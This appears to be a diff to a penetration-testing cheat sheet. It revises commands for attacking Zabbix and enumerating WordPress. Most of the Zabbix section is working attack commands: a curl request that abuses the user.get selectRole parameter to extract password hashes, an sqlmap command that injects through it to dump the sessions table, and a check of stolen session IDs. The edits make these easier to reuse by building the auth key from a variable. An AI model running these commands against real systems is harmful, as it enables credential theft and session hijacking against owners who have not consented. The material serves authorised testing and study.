@@ -166,9 +166,6 @@ wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 [*] Zabbix
-First, create an API key from the user profile menu.
-Example Auth Key: 97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f
-
 +---------- Login Get Auth Key ----------+
 curl \
 --request POST "http://$TARGET/zabbix/api_jsonrpc.php" \
@@ -188,20 +185,17 @@ for i in {0..50}; do response=$(curl \
 curl \
 --request POST -s "http://$TARGET/zabbix/api_jsonrpc.php" \
 --header 'Content-Type: application/json-rpc' \
---data '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"$AUTH_KEY", "id": 1}' | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
+--data "$(printf '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"%s", "id": 1}' "$AUTH_KEY")" | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
 
 +---------- Dump Active Sessions ----------+
 sqlmap \
 --method POST -u "http://$TARGET/zabbix/api_jsonrpc.php" \
 --headers="Content-Type: application/json-rpc" \
---data='{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"23b5c3d2e3c6a3ac6ec692ece555aad1","id":1}' \
+--data="$(printf '{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"%s","id":1}' "$AUTH_KEY")" \
 --random-agent -D zabbix -T sessions --columns --dump
 
 +---------- Verify Session ID ----------+
 curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
-
-
-
 
 [*] Technologies
 whatweb http://$TARGET
